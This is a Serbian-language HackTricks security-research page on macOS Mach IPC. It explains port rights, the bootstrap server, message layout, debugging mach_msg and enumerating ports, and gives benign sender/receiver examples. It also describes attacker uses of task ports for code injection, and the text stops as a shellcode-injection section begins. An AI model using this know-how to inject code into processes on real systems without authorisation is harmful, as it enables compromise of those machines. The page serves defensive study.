# macOS IPC - Međuprocesna komunikacija

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach koristi **tasks** kao **najmanju jedinicu** za deljenje resursa, i svaki task može sadržati **više thread-ova**. Ovi **tasks i threads su mapirani 1:1 na POSIX procese i thread-ove**.

Komunikacija između tasks se odvija preko Mach Inter-Process Communication (IPC), koristeći jednosmerne kanale za komunikaciju. **Poruke se prenose između ports**, koji funkcionišu kao svojevrsne **message queue-e** kojima upravlja kernel.

Port je osnovni element Mach IPC. Može se koristiti za **slanje poruka i za prijem** istih.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach port-ove procesa**. Ime mach porta je zapravo broj (pokazivač na kernel objekat).

Proces takođe može poslati ime porta sa određenim privilegijama **drugom task-u** i kernel će napraviti odgovarajući unos u **IPC tabeli drugog task-a**.

### Port Rights

Port rights, koji definišu koje operacije task može izvršavati, su ključni za ovu komunikaciju. Mogući **port rights** su ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, koji omogućava prijem poruka poslatih na port. Mach ports su MPSC (multiple-producer, single-consumer) queue-i, što znači da može postojati **samo jedan receive right za svaki port** u celom sistemu (za razliku od pipe-ova, gde više procesa može držati file descriptor za čitanje jednog pipe-a).
- Task sa **Receive** pravom može primati poruke i **kreirati Send rights**, omogućavajući mu slanje poruka. Izvorno, samo **vlastiti task ima Receive right nad svojim portom**.
- Ako vlasnik Receive prava **umre** ili ga ukine, **send right postaje beskoristan (dead name).**
- **Send right**, koji omogućava slanje poruka na port.
- Send right se može **klonirati** pa task koji poseduje Send right može klonirati pravo i **dodeliti ga trećem task-u**.
- Imajte na umu da se **port rights** takođe mogu **prosleđivati** kroz Mac poruke.
- **Send-once right**, koji omogućava slanje jedne poruke na port i zatim nestaje.
- Ovo pravo se **ne može klonirati**, ali se može **pomeriti**.
- **Port set right**, koji označava _port set_ umesto pojedinačnog porta. Uzimanje poruke iz port seta uzima poruku iz jednog od portova koje sadrži. Port set-ovi se mogu koristiti za slušanje na više portova istovremeno, slično `select`/`poll`/`epoll`/`kqueue` u Unix-u.
- **Dead name**, koji nije stvarno port pravo, već samo rezervna oznaka. Kada se port uništi, sva postojeća port prava ka tom portu postaju dead names.

**Tasks mogu prenositi SEND rights drugim**, omogućavajući im da šalju poruke nazad. **SEND rights se takođe mogu klonirati, tako da task može duplicirati i dati pravo trećem task-u**. Ovo, u kombinaciji sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između tasks.

### File Ports

File ports omogućavaju enkapsulaciju file descriptor-a u Mac port-ove (koristeći Mach port rights). Moguće je kreirati `fileport` iz datog FD koristeći `fileport_makeport` i kreirati FD iz fileport-a koristeći `fileport_makefd`.

### Establishing a communication

Kao što je ranije pomenuto, moguće je slati rights koristeći Mach poruke, međutim, **ne možete poslati pravo bez već postojećeg prava** da pošaljete Mach poruku. Pa kako se uspostavlja prva komunikacija?

U tome učestvuje **bootstrap server** (**launchd** na macOS), pošto **svako može dobiti SEND right ka bootstrap server-u**, moguće je od njega zatražiti pravo da se pošalje poruka drugom procesu:

1. Task **A** kreira **novi port**, dobijajući **RECEIVE right** nad njim.
2. Task **A**, kao posednik RECEIVE prava, **generiše SEND right za port**.
3. Task **A** uspostavlja **konekciju** sa **bootstrap server-om**, i **šalje mu SEND right** za port koji je prethodno generisao.
- Zapamtite da svako može dobiti SEND right ka bootstrap server-u.
4. Task A šalje `bootstrap_register` poruku bootstrap server-u da **asocira dati port sa imenom** kao što je `com.apple.taska`
5. Task **B** komunicira sa **bootstrap server-om** da izvrši bootstrap **lookup za ime servisa** (`bootstrap_lookup`). Da bi bootstrap server mogao da odgovori, task B će mu poslati **SEND right ka portu koji je prethodno kreirao** unutar lookup poruke. Ako je lookup uspešan, **server duplicira SEND right** koji je primio od Task A i **prosleđuje ga Task B-u**.
- Zapamtite da svako može dobiti SEND right ka bootstrap server-u.
6. Sa tim SEND right-om, **Task B** može **poslati poruku** **Task A-u**.
7. Za dvosmernu komunikaciju obično task **B** generiše novi port sa **RECEIVE** pravom i **SEND** pravom, i daje **SEND right Task A-u** kako bi A mogao da šalje poruke TASK B-u (dvosmerna komunikacija).

Bootstrap server **ne može autentifikovati** ime servisa koje tvrdi neki task. To znači da bi **task** potencijalno mogao **ugrabiti identitet bilo kog sistemskog task-a**, na primer lažno **izjavljujući ime autorizacionog servisa** i potom odobravajući svaki zahtev.

Apple čuva **imena servisa koje pruža sistem** u bezbednim konfiguracionim fajlovima, smeštenim u direktorijumima zaštićenim SIP-om: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored svakog imena servisa, **povezani binarni fajl je takođe sačuvan**. Bootstrap server će kreirati i držati **RECEIVE right za svako od ovih imena servisa**.

Za ove unapred definisane servise, **proces lookup-a se malo razlikuje**. Kada se traži ime servisa, launchd startuje servis dinamički. Novi tok rada je sledeći:

- Task **B** pokreće bootstrap **lookup** za ime servisa.
- **launchd** proverava da li je task pokrenut i ako nije, **pokreće** ga.
- Task **A** (servis) izvršava **bootstrap check-in** (`bootstrap_check_in()`). Ovde, **bootstrap** server kreira SEND right, zadržava ga, i **prenosi RECEIVE right Task A-u**.
- launchd duplicira **SEND right i šalje ga Task B-u**.
- Task **B** generiše novi port sa **RECEIVE** pravom i **SEND** pravom, i daje **SEND right Task A-u** (svc) kako bi on mogao da šalje poruke TASK B-u (dvosmerna komunikacija).

Međutim, ovaj proces važi samo za unapred definisane sistemske task-ove. Ne-sistemski task-ovi i dalje rade kao što je prvobitno opisano, što potencijalno može omogućiti impersonaciju.

> [!CAUTION]
> Dakle, launchd nikada ne bi smeo da se sruši ili će ceo sistem otkazati.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcija `mach_msg`, ustvari system call, koristi se za slanje i prijem Mach poruka. Funkcija zahteva da poruka koja se šalje bude prosleđena kao inicijalni argument. Ta poruka mora počinjati sa `mach_msg_header_t` strukturom, a zatim sledi stvarni sadržaj poruke. Struktura je definisana na sledeći način:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

Početno polje **`msgh_bits`** je bitmapa:

- Prvi bit (najznačajniji) se koristi da označi da je poruka kompleksna (više o ovom dole)
- 3. i 4. se koriste od strane kernela
- **5 najmanje značajnih bitova 2. bajta** mogu se koristiti za **voucher**: drugi tip porta za slanje key/value kombinacija.
- **5 najmanje značajnih bitova 3. bajta** mogu se koristiti za **local port**
- **5 najmanje značajnih bitova 4. bajta** mogu se koristiti za **remote port**

Tipovi koji se mogu navesti u voucher, local i remote portovima su (iz [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na primer, `MACH_MSG_TYPE_MAKE_SEND_ONCE` može da se koristi da **naznači** da bi trebalo izvesti i preneti **pravo za jednokratno slanje** za ovaj port. Takođe može biti specificirano `MACH_PORT_NULL` da se spreči да primalac može да одговори.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

> [!TIP]
> Imajte na umu da se ovakva dvosmerna komunikacija koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ali **obično se kreiraju različiti portovi** kao što je prethodno objašnjeno kako bi se uspostavila dvosmerna komunikacija.

Ostala polja u zaglavlju poruke su:

- `msgh_size`: veličina celog paketa.
- `msgh_remote_port`: port na koji se ova poruka šalje.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID ove poruke, koji tumači primalac.

> [!CAUTION]
> Imajte na umu da se **mach poruke šalju preko `mach port`**, koji je komunikacioni kanal ugrađen u mach kernel sa **jednim primaocem** i **višestrukim pošiljaocima**. **Više procesa** može **slati poruke** na mach port, ali u bilo kom trenutku samo **jedan proces može čitati** iz njega.

Poruke se zatim formiraju od zaglavlja **`mach_msg_header_t`** praćenog **telom** i **trailerom** (ako postoji) i ono može da dodeli dozvolu za odgovor na nju. U tim slučajevima, kernel samo treba da prosledi poruku iz jednog task-a u drugi.

A **trailer** je **informacija koju kernel dodaje poruci** (ne može je podesiti korisnik) i koja se može zatražiti prilikom prijema poruke koristeći zastavice `MACH_RCV_TRAILER_<trailer_opt>` (može se tražiti različita informacija).

#### Complex Messages

Međutim, postoje i druge, **složenije** poruke, poput onih koje prenose dodatna prava na port ili dele memoriju, gde kernel takođe treba da pošalje ove objekte primaocu. U tim slučajevima se postavlja najznačajniji bit u zaglavlju `msgh_bits`.

Mogući deskriptori koji se mogu prenositi su definisani u [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
U 32-bitnom okruženju svi deskriptori su 12B, a tip deskriptora se nalazi u 11. bajtu. U 64-bitnom okruženju veličine variraju.

> [!CAUTION]
> Kernel će kopirati deskriptore iz jednog task-a u drugi, ali prvo **praveći kopiju u kernel memoriji**. Ova tehnika, poznata kao "Feng Shui", iskorišćavana je u nekoliko exploits da natera **kernel da kopira podatke u svoju memoriju**, što omogućava procesu da pošalje deskriptore samom sebi. Zatim proces može primiti poruke (kernel će ih osloboditi).
>
> Takođe je moguće **poslati port rights ranjivom procesu**, i port rights će se jednostavno pojaviti u procesu (čak i ako on njima ne upravlja).

### Mac Ports API-ji

Imajte na umu da su portovi povezani sa task namespace-om, pa se za kreiranje ili pretragu porta takođe pretražuje task namespace (više u `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Kreira** port.
- `mach_port_allocate` može takođe kreirati **port set**: receive right nad grupom portova. Kad se poruka primi, naznačeno je sa kog porta dolazi.
- `mach_port_allocate_name`: Menja ime porta (po defaultu 32-bitni integer)
- `mach_port_names`: Dobija nazive portova iz target-a
- `mach_port_type`: Dobija prava task-a nad imenom
- `mach_port_rename`: Preimenuje port (kao dup2 za FDs)
- `mach_port_allocate`: Alocira novi RECEIVE, PORT_SET ili DEAD_NAME
- `mach_port_insert_right`: Kreira novo pravo (right) na portu na kojem imate RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funkcije koje se koriste za **slanje i primanje mach poruka**. Overwrite verzija omogućava specifikovanje drugačijeg bafera za prijem poruke (druga verzija će ga samo ponovo koristiti).

### Debagovanje mach_msg

Pošto su funkcije **`mach_msg`** i **`mach_msg_overwrite`** one koje se koriste za slanje i prijem poruka, postavljanje breakpoint-a na njih omogućava inspekciju poslatih i primljenih poruka.

Na primer, počnite debugovanje bilo koje aplikacije koju možete debug-ovati, jer će učitati **`libSystem.B` koja koristi ovu funkciju**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Da biste dobili argumente **`mach_msg`**, proverite registre. Ovo su argumenti (iz [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Dohvati vrednosti iz registara:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Pregledajte zaglavlje poruke proveravajući prvi argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Taj tip `mach_msg_bits_t` je veoma čest kako bi omogućio odgovor.

### Enumerisanje portova
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **ime** je podrazumevano ime dodeljeno portu (pogledajte kako se **povećava** u prva 3 bajta). The **`ipc-object`** je **obfuskovani** jedinstveni **identifikator** porta.\
Obratite pažnju i na to kako portovi koji imaju samo **`send`** pravo **identifikuju vlasnika porta** (ime porta + pid).\
Takođe obratite pažnju na upotrebu **`+`** da označi **ostale zadatke povezane sa istim portom**.

Takođe je moguće koristiti [**procesxp**](https://www.newosxbook.com/tools/procexp.html) da biste videli i **registrovana imena servisa** (sa SIP onemogućenim zbog potrebe za `com.apple.system-task-port`):
```
procesp 1 ports
```
Možete instalirati ovaj alat na iOS preuzimanjem sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju kako **sender** dodeljuje port, kreira **send right** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru**, dok je **sender** zatražio **send right** za to ime i iskoristio ga da **pošalje poruku**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privilegovani portovi

Postoje neki specijalni portovi koji omogućavaju da se izvrše određene osetljive radnje ili pristupi određenim osetljivim podacima ukoliko zadatak ima **SEND** dozvolu nad njima. To čini ove portove vrlo interesantnim iz perspektive napadača, ne samo zbog mogućnosti koje pružaju već i zato što je moguće **deliti SEND dozvole između zadataka**.

### Host specijalni portovi

Ovi portovi su predstavljeni brojem.

**SEND** prava se mogu dobiti pozivanjem **`host_get_special_port`**, a **RECEIVE** prava pozivanjem **`host_set_special_port`**. Međutim, oba poziva zahtevaju **`host_priv`** port kojem može pristupiti samo root. Štaviše, u prošlosti je root mogao da pozove **`host_set_special_port`** i preotme proizvoljne portove, što je, na primer, omogućavalo zaobilaženje code signatures preotimanjem `HOST_KEXTD_PORT` (SIP sada to sprečava).

Podeljeni su u 2 grupe: Prvih 7 portova su u vlasništvu kernela: 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` i 7 `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Portovi koji počinju od broja **8** su u vlasništvu sistemskih daemona i mogu se naći deklarisani u [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Ako proces ima **SEND** privilegiju nad ovim portom, može dobiti **informacije** o **sistemu** pozivajući njegove rutine kao što su:
- `host_processor_info`: Dobija informacije o procesoru
- `host_info`: Dobija informacije o hostu
- `host_virtual_physical_table_info`: Virtuelna/fizička tabela stranica (zahteva MACH_VMDEBUG)
- `host_statistics`: Dobija statistiku hosta
- `mach_memory_info`: Dobija raspored kernel memorije
- **Host Priv port**: Proces sa **SEND** pravom nad ovim portom može izvršavati **privilegovane radnje** kao što su prikazivanje boot podataka ili pokušaj učitavanja kernel ekstenzije. Proces mora biti root da bi dobio ovu dozvolu.
- Pored toga, za pozivanje **`kext_request`** API-ja potrebno je imati druge entitlements **`com.apple.private.kext*`** koji se dodeljuju samo Apple binarima.
- Druge rutine koje se mogu pozvati su:
- `host_get_boot_info`: Vraća `machine_boot_info()`
- `host_priv_statistics`: Dobija privilegovanu statistiku
- `vm_allocate_cpm`: Alocira kontigualnu fizičku memoriju
- `host_processors`: Dodeljuje SEND pravo host procesorima
- `mach_vm_wire`: Učini memoriju residentnom
- Pošto **root** može pristupiti ovoj dozvoli, može pozvati `host_set_[special/exception]_port[s]` kako bi preoteo host special ili exception portove.

Moguće je **videti sve host special portove** pokretanjem:
```bash
procexp all ports | grep "HSP"
```
### Posebni portovi zadatka

Ovo su portovi rezervisani za dobro poznate servise. Moguće ih je dobiti/postaviti pozivanjem `task_[get/set]_special_port`. Mogu se naći u `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Port koji se koristi za kontrolu ovog task‑a. Koristi se za slanje poruka koje utiču na task. Ovo je port koji vraća **mach_task_self (vidi odeljak Task portovi ispod)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Bootstrap port task‑a. Koristi se za slanje poruka koje zahtevaju povratak drugih portova sistemskih servisa.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Port koji se koristi za zahtev informacija o hostu koji sadrži task. Ovo je port koji vraća **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Port koji imenuje izvor iz kojeg ovaj task uzima svoj wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Port koji imenuje izvor iz kojeg ovaj task uzima svoj default managed memory.

### Task portovi

Izvorno Mach nije imao "processes", već je imao "tasks" koje su se smatrale više kontejnerima za thread‑ove. Kada je Mach spojen sa BSD‑om, **svaki task je korelisan sa BSD procesom**. Dakle, svaki BSD proces ima detalje potrebne da bude proces, a svaki Mach task takođe ima svoje unutrašnje mehanizme (osim nepostojećeg pid 0 koji je `kernel_task`).

Postoje dve vrlo interesantne funkcije vezane za ovo:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Dobija SEND right za task port task‑a povezanog sa navedenim `pid` i daje ga u označeni `target_task_port` (što je obično task koji poziva i koji je koristio `mach_task_self()`, ali može biti i SEND port preko nekog drugog task‑a).
- `pid_for_task(task, &pid)`: Dajući SEND right na task, pronađe kojem PID‑u je taj task povezan.

Da bi izvršio akcije u okviru task‑a, task treba SEND right na sebe dobijen pozivom `mach_task_self()` (što koristi `task_self_trap` (28)). Sa ovom dozvolom task može izvršiti nekoliko akcija kao što su:

- `task_threads`: Dobija SEND prava nad svim thread portovima task‑a
- `task_info`: Dobija informacije o task‑u
- `task_suspend/resume`: Suspenduje ili nastavlja task
- `task_[get/set]_special_port`
- `thread_create`: Kreira thread
- `task_[get/set]_state`: Kontroliše stanje task‑a
- i još funkcija koje se mogu naći u [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Obratite pažnju da, sa SEND right‑om nad task portom nekog **drugog task‑a**, je moguće izvršavati takve akcije nad tim drugim task‑om.

Pored toga, task_port je takođe **`vm_map`** port koji omogućava **čitanje i manipulaciju memorijom** unutar task‑a pomoću funkcija kao što su `vm_read()` i `vm_write()`. To u suštini znači da će task sa SEND pravima nad task_port‑om drugog task‑a moći da **inject‑uje code u taj task**.

Zapamtite da, pošto je i **kernel takođe task**, ako neko uspe da dobije **SEND permissions** nad **`kernel_task`**, biće u stanju da natera kernel da izvrši bilo šta (jailbreak‑ovi).

- Pozovite `mach_task_self()` da biste **dobili ime** za ovaj port za task koji poziva. Ovaj port se nasledjuje samo preko **`exec()`**; novi task kreiran sa `fork()` dobija novi task port (kao specijalan slučaj, task takođe dobija novi task port posle `exec()` u suid binarnom fajlu). Jedini način da se pokrene task i dobije njegov port je izvođenje ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) tokom `fork()`.
- Ovo su ograničenja za pristup portu (iz `macos_task_policy` iz binarnog fajla `AppleMobileFileIntegrity`):
  - Ako aplikacija ima **`com.apple.security.get-task-allow` entitlement** procesi istog korisnika mogu pristupiti task portu (obično dodato od strane Xcode‑a za debugging). Proces **notarization** neće dozvoliti ovo za produkcijska izdanja.
  - Aplikacije sa **`com.apple.system-task-ports`** entitlement‑om mogu dobiti **task port za bilo koji** proces, osim kernela. U starijim verzijama se zvalo **`task_for_pid-allow`**. Ovo se dodeljuje samo Apple aplikacijama.
  - **Root može pristupiti task portovima** aplikacija koje NIJE kompajlirao sa **hardened** runtime‑om (i koje nisu od Apple‑a).

**The task name port:** Neprivilegovana verzija _task port_. Referencira task, ali ne dozvoljava njegovo kontrolisanje. Jedina stvar koja izgleda da je dostupna preko njega je `task_info()`.

### Thread portovi

Thread‑ovi takođe imaju pridružene portove, koji su vidljivi iz task‑a pozivajući **`task_threads`** i iz procesora sa `processor_set_threads`. SEND right na thread port omogućava korišćenje funkcija iz `thread_act` subsystema, kao što su:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Bilo koji thread može dobiti ovaj port pozivom na **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Možete uzeti shellcode iz:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

